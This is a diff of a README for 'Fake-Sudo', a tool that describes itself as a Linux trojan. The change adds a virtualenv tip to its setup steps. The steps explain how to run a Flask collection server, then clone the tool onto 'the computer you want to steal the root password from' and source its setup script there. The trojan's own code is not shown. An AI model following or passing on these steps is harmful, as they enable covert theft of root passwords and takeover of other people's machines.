@@ -5,7 +5,7 @@ A linux trojan
 The following commands shall be executed in the terminal.
 1. Clone the repo<br>`git clone https://github.com/NarmakTwo/Fake-Sudo.git`<br>`cd Fake-Sudo`
 2. Install pip if you haven't already<br>`sudo apt instal pip -y`
-3. Make a server<br>`pip install flask`<br>`python3 flask.py`
+3. Make a server<br>`pip install flask`<br>`python3 flask.py` (you might have to make a venv, `pip install virtualenv && python3 -m virtualenv venv1 && source ./venv1/bin/activate`)
 4. Go to the computer you want to steal the root password from
 5. Clone the repo<br>`git clone https://github.com/NarmakTwo/Fake-Sudo.git`<br>`cd Fake-Sudo`
 6. Setup the program<br>`chmod a+x setup.sh`<br>`source setup.sh`
